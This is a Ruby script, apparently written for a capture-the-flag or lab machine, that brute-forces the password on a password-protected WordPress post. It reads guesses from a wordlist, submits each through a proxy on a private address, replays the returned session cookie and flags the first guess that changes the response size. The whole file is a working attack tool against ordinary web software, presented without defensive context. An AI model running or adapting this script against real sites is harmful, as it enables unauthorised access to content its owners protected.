require "net/http"
require "uri"
require "base64"
require "rainbow/ext/string"
 
target_url = URI.parse(ARGV[0])
fuzzfile = ARGV[1]
blogpage = "http://10.0.0.239/blog/index.php/2016/10/16/the-secret-chapter/"
 
ENV['http_proxy'] = 'http://10.0.0.239:3129'
 
counter = 0
prevsize = 0
 
File.open(fuzzfile).each do | fuzzvalue |
    fuzzvalue = fuzzvalue.delete("\n").strip
 
    cookieheader = { "Host" => "192.168.110.10", "Referer" => blogpage, "Cookie" => "wordpress_test_cookie=WP+Cookie+check; wp-postpass_af36d351f0a2a7010d4334f6d3418ed2=%24P%24BliNI6VL3%2F5BjOcRk5x28%2FphGmIAKO1" }
 
    cookierequest = Net::HTTP::Post.new("#{target_url.path}?#{target_url.query}", cookieheader)
    cookierequest.set_form_data({
        "post_password" => fuzzvalue,
        "Submit" => "Enter"
    })
 
    cookiehttp = Net::HTTP.new(target_url.host, target_url.port)
    cookieresponse = cookiehttp.request(cookierequest)
 
    bloguri = URI.parse(cookieresponse["Location"])
    blogreq = Net::HTTP::Get.new(bloguri.request_uri)
    blogcookiedata = cookieresponse["Set-Cookie"].split("; ")
    blogcookie = "#{blogcookiedata[0]};#{blogcookiedata[1].split(",")[1]}"
 
    blogreq.add_field("Cookie", blogcookie)
    bloghttp = Net::HTTP.new(bloguri.host, bloguri.port)
    blogresponse = bloghttp.request(blogreq)
 
    counter += 1
 
    if blogresponse.body.length != prevsize && prevsize > 0
        puts("#{counter} - Size: #{blogresponse.body.length} Fuzz value: #{fuzzvalue}".color(:green))
        break
    else
        puts("#{counter} - Size: #{blogresponse.body.length} Fuzz value: #{fuzzvalue}")
        prevsize = blogresponse.body.length
    end
end
